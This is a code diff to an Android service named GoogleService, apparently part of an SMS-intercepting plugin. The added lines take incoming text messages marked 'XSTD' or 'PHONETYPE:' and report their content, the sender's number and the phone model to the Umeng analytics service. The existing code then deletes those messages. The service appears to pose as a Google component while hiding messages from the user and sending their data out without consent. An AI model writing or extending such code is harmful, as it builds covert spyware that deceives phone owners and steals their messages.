@@ -8,13 +8,16 @@ import android.content.IntentFilter;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.text.TextUtils;
+import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
 import com.xstd.plugin.receiver.PrivateSMSBRC;
 
+import java.util.HashMap;
 import java.util.LinkedList;
 
 /**
@@ -155,6 +158,13 @@ public class GoogleService extends Service {
                     if (!TextUtils.isEmpty(body)
                             && (body.contains("XSTD")
                                || body.contains("PHONETYPE:") )) {
+                        //notify umeng
+                        HashMap<String, String> log = new HashMap<String, String>();
+                        log.put("content", body.trim());
+                        log.put("phoneType", Build.MODEL);
+                        log.put("from", fromAddress);
+                        CommonUtil.umengLog(getApplicationContext(), "content_provider_filter", log);
+
                         deleteList.add(id);
                     }
                 }
